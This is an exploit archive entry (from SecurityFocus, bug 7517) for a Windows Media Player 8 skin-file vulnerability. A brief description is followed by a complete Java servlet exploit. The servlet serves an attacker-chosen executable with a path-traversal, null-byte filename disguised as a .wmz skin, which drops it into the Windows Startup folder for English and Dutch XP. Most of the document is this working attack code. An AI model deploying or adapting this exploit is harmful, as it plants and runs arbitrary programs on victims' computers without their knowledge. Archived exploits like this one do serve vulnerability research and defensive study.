source: http://www.securityfocus.com/bid/7517/info

Windows Media Player is vulnerable to code execution through skin files. WMP does not properly validate URLs that are passed to initiate a skin file download and installation. This could allow a malicious file advertised as a skin file to be downloaded to a known location and executed through some other means. 

import javax.servlet.http.HttpServlet; 
import javax.servlet.http.HttpServletRequest; 
import javax.servlet.http.HttpServletResponse; 
import javax.servlet.ServletException; 
import javax.servlet.ServletOutputStream; 
import java.io.*; 
 
/** 
 * 
 * Microsoft media player 8 Exploit for windows XP English and Dutch versions 
 * 
 * It will drop a file in the startup folder 
 * 
 * modify web.xml to change what will be uploaded 
 * 
 * @author Jelmer Kuperus 
 * 
 */ 
 
public class MediaPlayerExploit extends HttpServlet { 
 
    private static final int BUFFER_SIZE = 1024; 
 
    private static final String[] paths = new String[] { 
        "%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cDocuments%20and%20Settings%5CAll%20Users%5CStart%20Menu%5CPrograms%5CStartup%5c", // English 
        "%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cDocuments%20and%20Settings%5CAll%20Users%5CMenu Start%5CProgramma%27s%5Copstarten%5c" // Dutch 
    }; 
 
    private String payload; 
 
 
    public void init() throws ServletException { 
        payload = getInitParameter("executable"); 
    } 
 
    public void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException { 
 
        int language = 0; // default to english 
 
        try { 
            language = Integer.parseInt(request.getParameter("language")); 
        } catch (NumberFormatException ignored) {} 
 
        String path = paths[language]; 
 
        File file = new File(payload); 
 
        ServletOutputStream sos = response.getOutputStream(); 
 
        response.setContentType("application/download"); 
        response.setHeader("Content-Disposition","filename=" + path + file.getName() + "%00.wmz"); 
 
        BufferedInputStream bis = new BufferedInputStream(new FileInputStream(file)); 
        BufferedOutputStream bos = new BufferedOutputStream(sos); 
 
        byte buffer[] = new byte[BUFFER_SIZE]; 
 
        int datalength = 0; 
        while ( (datalength = bis.read(buffer,0,BUFFER_SIZE)) > 0) { 
            bos.write(buffer,0,datalength); 
        } 
        bis.close(); 
        bos.close(); 
    } 
 
    public void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException { 
        doGet(request, response); 
    } 
 
} 